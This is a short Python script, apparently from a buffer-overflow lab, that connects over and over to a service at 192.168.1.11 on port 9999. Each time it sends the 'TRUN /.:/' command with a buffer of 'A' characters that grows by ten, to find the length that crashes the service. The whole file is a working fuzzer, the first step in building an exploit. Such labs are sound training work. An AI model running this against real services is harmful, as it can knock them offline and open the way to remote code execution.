import time,sys
import socket

server = "192.168.1.11"
port = 9999

buffer="A"* 100
request = "TRUN /.:/"

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    print("Sending buffer size of: "+ str(len(buffer)))
    s.send(request + buffer)
    print(s.recv(1024))
    s.close()
    buffer = buffer + "A"*10
    time.sleep(1)